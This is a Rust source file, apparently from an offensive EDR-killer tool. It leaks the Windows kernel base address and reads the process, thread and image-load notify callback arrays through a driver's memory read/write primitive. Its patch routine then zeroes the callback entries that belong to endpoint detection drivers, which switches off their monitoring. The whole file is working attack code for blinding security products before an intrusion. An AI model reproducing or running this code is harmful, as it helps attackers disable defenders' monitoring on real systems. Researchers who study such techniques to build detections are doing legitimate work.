use windows_sys::Win32::Foundation::HANDLE;

use log::{info};

use crate::Driver;
use crate::FoundEdrDrivers;
use crate::Offsets;
use crate::Utils;

pub struct KernelNotifyRoutine;

impl KernelNotifyRoutine {
    pub unsafe fn enumerate(driver_handle: HANDLE, own_process_handle: HANDLE) {
        let mut last_routine = "".to_string().to_owned();
        let found_edr_drivers = enumerate_edr_drivers(driver_handle, own_process_handle);
        for edr in found_edr_drivers {
            if last_routine == edr.routine || last_routine.is_empty() {
                info!("[>] Found EDR: {} using: {} at: 0x{:x}", edr.driver_name, edr.routine, edr.call_back_struct_addr);
                last_routine = edr.routine;
            } else {
                info!("");
                info!("[>] Found EDR: {} using: {} at: 0x{:x}", edr.driver_name, edr.routine, edr.call_back_struct_addr);
                last_routine = edr.routine;
            }
        }
    }

    pub unsafe fn patch(driver_handle: HANDLE, own_process_handle: HANDLE) {
        let mut last_routine = "".to_string().to_owned();
        let found_edr_drivers = enumerate_edr_drivers(driver_handle, own_process_handle);
    
        for edr in found_edr_drivers {
            if last_routine == edr.routine || last_routine.is_empty() {
                if remove_edr_callback(driver_handle, own_process_handle, edr.call_back_struct_addr) {
                    info!("[>] Disabled: {} using: {}", edr.driver_name, edr.routine);
                    last_routine = edr.routine;
                } else {
                    info!("[x] Failed to disable: {} using: {}", edr.driver_name, edr.routine);
                    last_routine = edr.routine;
                }
            } else {
                info!("");
                if remove_edr_callback(driver_handle, own_process_handle, edr.call_back_struct_addr) {
                    info!("[>] Disabled: {} using: {}", edr.driver_name, edr.routine);
                    last_routine = edr.routine;
                } else {
                    info!("[x] Failed to disable: {} using: {}", edr.driver_name, edr.routine);
                    last_routine = edr.routine;
                }
            }
        }
    }
}

unsafe fn remove_edr_callback(driver_handle: HANDLE, own_process_handle: HANDLE, address: u64) -> bool {
    let mut disable: u64 = 0;
    let size = std::mem::size_of_val(&disable) as u64;

    if Driver::memory_write(
        driver_handle,
        address,
        &mut disable,
        size,
        own_process_handle,
    ) {
        return true;
    } else {
        return false;
    }
}

unsafe fn enumerate_edr_drivers(driver_handle: HANDLE, own_process_handle: HANDLE) -> Vec<FoundEdrDrivers> {
    let ntos_kernel_base_address = Utils::get_kernel_base_address();
    let ntos_kernel_version = Utils::get_ntoskrnl_version();
    let mut edr_drivers: Vec<FoundEdrDrivers> = Vec::new();

    if ntos_kernel_base_address > 0 {
        info!("[>] Leaked ntoskrnl base address: 0x{:x}", ntos_kernel_base_address);

        if !ntos_kernel_version.is_empty() {
            info!("[>] Got ntoskrnl version: {}", ntos_kernel_version);

            let (_, create_process, create_thread, load_image, _, _, _, _, _, _, _) = Offsets::get_offsets(ntos_kernel_version);
            let routines = vec!["CreateProcess", "CreateThread", "LoadImage"];
            let offsets = vec![create_process, create_thread, load_image];
            let mut counter = 0;

            for routine in routines {
                let psp_routine = Utils::make_psp_routine(routine);
                let psp_routine_addr = Utils::get_notify_address(ntos_kernel_base_address, offsets[counter] as usize);
                info!("[!] Enumerating EDR drivers using {}", psp_routine);

                for i in 0..64 {
                    let mut call_back_struct: u64 = 0;
                    let size = std::mem::size_of_val(&call_back_struct) as u64;
                    Driver::memory(driver_handle, (psp_routine_addr + (i * 8)) as u64, &mut call_back_struct, size, own_process_handle);

                    if call_back_struct != 0 {
                        let callback = (call_back_struct & !0b1111) + 8;
                        let mut function: u64 = 0;
                        let size = std::mem::size_of_val(&function) as u64;

                        Driver::memory(driver_handle, callback, &mut function, size, own_process_handle);
                        
                        let mut driver_offset: u64 = 0;
                        let driver_name = Utils::get_driver(function, &mut driver_offset);

                        if !driver_name.clone().is_empty() && Utils::is_driver_name_edr(driver_name.clone()) {
                            let call_back_addr: u64 = (psp_routine_addr + (i * 8)) as u64;

                            edr_drivers.push(FoundEdrDrivers {
                                driver_name: driver_name.clone(),
                                routine: psp_routine.to_string(),
                                call_back_func: function,
                                call_back_struct: call_back_struct,
                                call_back_struct_addr: call_back_addr,
                                removed: false,
                            });
                        }
                    }
                }
                counter += 1;
            }
        }
    }
    edr_drivers
}